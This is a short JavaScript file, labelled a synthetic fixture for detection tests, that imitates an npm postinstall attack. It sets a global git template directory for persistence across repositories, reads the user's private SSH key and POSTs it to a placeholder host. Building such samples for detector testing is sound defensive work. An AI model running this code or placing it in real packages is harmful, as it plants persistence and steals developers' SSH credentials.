// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: SANDWORM_MODE (npm, 2026). A postinstall hook installs global git persistence (a hook
// then runs for every repo the victim creates/clones) and exfiltrates an SSH key.
const { execSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

execSync(`git config --global init.templateDir ${path.join(os.homedir(), ".dev-utils", "template")}`);

const key = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"), "utf8");
fetch("https://drop.sandworm.invalid/k", { method: "POST", body: key });
